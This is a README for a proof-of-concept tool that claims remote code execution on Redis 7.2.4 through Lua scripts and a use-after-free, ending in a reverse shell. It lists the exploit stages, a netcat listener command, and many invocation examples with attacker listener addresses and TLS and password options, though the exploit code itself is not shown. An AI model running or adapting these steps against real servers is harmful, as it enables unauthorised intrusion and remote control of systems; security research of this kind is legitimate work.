# Redis 7.2.4 RCE Exploit

A proof-of-concept exploit for Redis 7.2.4 that demonstrates a remote code execution vulnerability. This exploit is based on the original work by [p333zy](https://github.com/p333zy/poc-redis) and has been modified to support password authentication.

## ⚠️ Disclaimer

This tool is provided for **educational and research purposes only**. It should only be used on systems you own or have explicit permission to test. The authors are not responsible for any misuse of this tool.

## 📋 Prerequisites

- Python 3.7+
- Docker (for running Redis container)
- Redis Python client library

## 🚀 Quick Setup

### 1. Install Dependencies

```bash
# Create virtual environment
python3 -m venv .venv
source .venv/bin/activate

# Install requirements
pip install redis
```

### 2. Start Redis Container

```bash
# Run Redis 7.2.4 container
docker run -d --name redis-7.2.4-docker -p 6380:6379 redis:7.2.4
```

### 3. Set Up Listener

In a separate terminal, start a netcat listener:

```bash
nc -nlvp 4444
```

### 4. Run the Exploit

```bash
# Basic usage (no password)
python3 exploit.py --rhost localhost --rport 6380 --lhost YOUR_IP --lport 4444

# With Redis password
python3 exploit.py --rhost localhost --rport 6380 --lhost YOUR_IP --lport 4444 --password your_redis_password
```

## 📖 Usage

### Command Line Arguments

| Argument | Required | Default | Description |
|----------|----------|---------|-------------|
| `--rhost` | Yes | - | Redis server host |
| `--rport` | No | 6379 | Redis server port |
| `--lhost` | Yes | - | Your listener host IP |
| `--lport` | Yes | - | Your listener port |
| `--password` | No | None | Redis password (if authentication is enabled) |
| `--tls` | No | False | Enable TLS/SSL connection to Redis |
| `--tls-cert` | No | None | Path to client certificate file |
| `--tls-key` | No | None | Path to client private key file |
| `--tls-ca` | No | None | Path to CA certificate file |
| `--tls-no-verify` | No | False | Disable TLS certificate verification (insecure) |

### Examples

#### Basic Exploit (No Authentication)
```bash
python3 exploit.py --rhost 192.168.1.100 --rport 6379 --lhost 192.168.1.50 --lport 4444
```

#### Exploit with Password Authentication
```bash
python3 exploit.py --rhost 192.168.1.100 --rport 6379 --lhost 192.168.1.50 --lport 4444 --password mysecretpassword
```

#### Using Custom Port
```bash
python3 exploit.py --rhost localhost --rport 6380 --lhost 127.0.0.1 --lport 4444
```

#### Exploit with TLS Connection
```bash
python3 exploit.py --rhost redis-tls.example.com --rport 6380 --lhost 192.168.1.50 --lport 4444 --tls --password mysecretpassword
```

#### Exploit with TLS and Certificate Verification
```bash
python3 exploit.py --rhost redis-tls.example.com --rport 6380 --lhost 192.168.1.50 --lport 4444 --tls --tls-ca /path/to/ca.crt --password mysecretpassword
```

#### Exploit with TLS and Client Certificates
```bash
python3 exploit.py --rhost redis-tls.example.com --rport 6380 --lhost 192.168.1.50 --lport 4444 --tls --tls-cert /path/to/client.crt --tls-key /path/to/client.key --password mysecretpassword
```

#### Exploit with TLS (No Certificate Verification)
```bash
python3 exploit.py --rhost redis-tls.example.com --rport 6380 --lhost 192.168.1.50 --lport 4444 --tls --tls-no-verify --password mysecretpassword
```

## 🔧 Technical Details

### Vulnerability
This exploit targets a specific vulnerability in Redis 7.2.4 that allows for remote code execution through Lua script execution.

### TLS Support
The exploit now supports TLS/SSL connections to Redis servers that require encrypted communication. This includes:

- **Basic TLS**: Simple TLS connection without certificate verification
- **Certificate Verification**: TLS with CA certificate verification
- **Client Certificates**: TLS with client certificate authentication
- **Custom Verification**: Options to disable certificate verification for testing

### TLS Configuration Options
- `--tls`: Enable TLS connection
- `--tls-cert`: Client certificate file path
- `--tls-key`: Client private key file path  
- `--tls-ca`: CA certificate file path
- `--tls-no-verify`: Disable certificate verification (insecure, for testing only)

### Exploit Stages
1. **Heap Grooming**: Prepares the heap for exploitation
2. **Address Leak**: Leaks memory addresses to bypass ASLR
3. **Object Forgery**: Creates fake objects in memory
4. **UAF Exploitation**: Exploits use-after-free vulnerability
5. **Command Execution**: Executes the reverse shell command

### Files Structure
```
.
├── exploit.py              # Main exploit script
├── stage1-clear-heap.lua   # Lua script for heap clearing
├── stage1-forge-objects.lua # Lua script for object forging
├── stage1-leak-tstring.lua # Lua script for address leaking
├── stage1-uaf.lua          # Lua script for UAF exploitation
└── README.md               # This file
```

## 🐛 Troubleshooting

### Common Issues

1. **Port Already in Use**
   ```bash
   # Check what's using the port
   sudo netstat -tlnp | grep :6379
   
   # Use a different port
   python3 exploit.py --rhost localhost --rport 6380 --lhost YOUR_IP --lport 4444
   ```

2. **Connection Refused**
   - Ensure Redis is running
   - Check firewall settings
   - Verify host and port are correct

3. **Authentication Failed**
   - Verify the password is correct
   - Check if Redis requires authentication
   - Try without password if Redis is not configured with authentication

4. **TLS Connection Failed**
   - Verify the Redis server supports TLS on the specified port
   - Check if the correct TLS certificates are provided
   - Try with `--tls-no-verify` for testing (insecure)
   - Verify the CA certificate is valid and trusted

5. **No Reverse Shell Received**
   - Check your listener is running
   - Verify the `--lhost` IP is reachable from the target
   - Check firewall rules on both systems

## 🔒 Security Notes

- This exploit is for **testing purposes only**
- Always test on isolated systems
- Do not use against production systems without permission
- Consider the legal implications in your jurisdiction

## 📝 Acknowledgments

This exploit is based on the original work by [p333zy](https://github.com/p333zy/poc-redis):

- **Original Repository**: https://github.com/p333zy/poc-redis
- **Original Author**: p333zy

### Modifications Made
- Added support for Redis password authentication
- Improved error handling and user feedback
- Enhanced documentation and usage examples

## 📄 License

This project is provided as-is for educational purposes. Please refer to the original repository for licensing information.

## 🤝 Contributing

If you find bugs or have improvements, please:
1. Test thoroughly on isolated systems
2. Document your changes
3. Ensure modifications don't break existing functionality

---

**Remember**: This tool is for educational purposes only. Always obtain proper authorization before testing on any system. 